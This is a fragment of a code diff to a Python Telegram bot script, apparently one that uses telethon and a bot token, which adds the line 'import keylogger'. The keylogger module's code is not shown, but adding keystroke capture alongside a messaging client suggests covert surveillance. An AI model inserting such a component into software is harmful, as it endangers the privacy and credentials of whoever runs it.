@@ -4,6 +4,7 @@ from telethon import TelegramClient
 import threading 
 import asyncio
 import requests
+import keylogger
 
 # Load environment variables
 BOT_TOKEN = os.environ.get('BOT_TOKEN')
